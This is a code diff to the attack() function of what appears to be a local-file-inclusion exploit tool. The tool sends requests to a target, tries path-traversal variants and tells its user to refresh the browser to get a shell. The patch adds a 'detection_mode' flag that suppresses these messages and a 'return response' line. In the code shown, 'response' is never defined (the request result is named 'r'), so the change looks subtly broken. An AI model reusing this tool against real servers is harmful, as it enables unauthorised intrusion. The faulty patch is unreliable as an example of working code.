@@ -66,7 +66,7 @@ def cook(cookies):
     return c
 
 
-def attack(target, location, cookies=None, headers=None, payload=None, traverse=False, relative=False, data=None, dt=False):
+def attack(target, location, cookies=None, headers=None, payload=None, traverse=False, relative=False, data=None, dt=False, detection_mode=False):
     """Perform specified type of LFI attack
 
     Arguments:
@@ -96,9 +96,12 @@ def attack(target, location, cookies=None, headers=None, payload=None, traverse=
             sys.exit(1)
         if not relative:
             r = requests.get(url, verify=False)
-            print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
             if r.status_code != 200:
-                print(colors("[!] Unexpected HTTP Response ", 91))
+                if not detection_mode:
+                    print(colors("[!] Unexpected HTTP Response ", 91))
+            else:
+                if not detection_mode:
+                    print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
 
         else:
             for traversal in PATH_TRAVERSAL:
@@ -109,6 +112,8 @@ def attack(target, location, cookies=None, headers=None, payload=None, traverse=
                         print(colors("[!] Unexpected HTTP Response ", 91))
             print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
 
+        return response
+        
     except Exception as e:
         print(colors("[!] HTTP Error", 91))
         print(e)
